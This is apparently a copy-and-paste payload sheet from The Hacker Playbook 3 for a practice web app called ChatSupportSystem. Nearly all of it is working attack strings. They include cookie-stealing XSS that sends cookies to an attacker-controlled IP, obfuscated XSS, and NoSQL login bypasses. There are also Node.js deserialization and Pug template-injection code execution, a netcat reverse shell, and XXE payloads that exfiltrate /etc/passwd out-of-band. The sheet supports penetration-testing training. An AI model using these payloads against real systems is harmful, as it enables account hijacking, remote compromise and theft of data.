# THP-ChatSupportSystem
The Hacker Playbook 3 - Web Attacks Copy and Paste Commands


XSS Basic Attacks:
Cookie Stealing XSS: <script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>
Forcing the Download of a File: <script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click();</script>
Redirecting User: <script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
Other Scripts to Enable Key Loggers, Take Pictures, and More: http://www.xss-payloads.com/payloads-list.html?c#category=capture

HTML Entities that Support XSS:
<b onmouseover=alert('XSS')>Click Me!</b>
<svg onload=alert(1)>
<body onload="alert('XSS')">
<img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>

Polyglot Example:
/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

JSF*ck Payload:
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()

NoSQL Example 1:
{"username":"admin","password":{"$gt":""}}

NoSQL Example 2:
username=admin&password[$gt]=&submit=login
username[$gt]=admin&password[$gt]=&submit=login

Deserialization in NodeJS:
{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('DO SYSTEM COMMANDS HERE', function(error, stdout, stderr) { console.log(stdout) });}()"}

Base64 Deserialization in NodeJS:
eyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2VjaG8gbm9kZSBkZXNlcmlhbGl6YXRpb24gaXMgYXdlc29tZSEhID4+IC9vcHQvd2ViL2NoYXRTdXBwb3J0U3lzdGVtcy9wdWJsaWMvaGFja2VkLnR4dCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9


Pug XSS Template Injection (after authentication):
http://chat:3000/ti?user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&comment=&link=	

Pug Template Injection (Multiplication):
http://chat:3000/ti?user=%0a%3d9*9&comment=&link=

Pug Template Injection:
%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%0a%20%20%70%3d%20%69%6e%64%65%78
%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%0a%20%20%70%3d%20%69%6e%64%65%78
%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%0a%20%20%70%3d%20%69%6e%64%65%78
%0a%2d%20%76%61%72%20%78%20%3d%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%20%0a%2d%20%78%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%3e%3e%20%2f%6f%70%74%2f%77%65%62%2f%63%68%61%74%53%75%70%70%6f%72%74%53%79%73%74%65%6d%73%2f%70%75%62%6c%69%63%2f%61%63%63%6f%75%6e%74%73%2e%74%78%74%27%29

JavaScript Upload RCE:
-var x = global.process.mainModule.require
-x('child_process').exec('nc [Your_IP] 8888 -e /bin/bash')

XXE:
<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The %26book%3B</thp>

XXE OOB:
<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY ><!ENTITY % dtd SYSTEM "http://[Your_IP]/payload.dtd"> %dtd;]><thp><error>%26send%3B</error></thp>

XXE OOB DTD:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://[Your_IP]:8888/collect=%file;'>">
%all;

XXE OOB DTD Base64:
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://[Your_IP]:8888/collect=%file;'>">
%all;
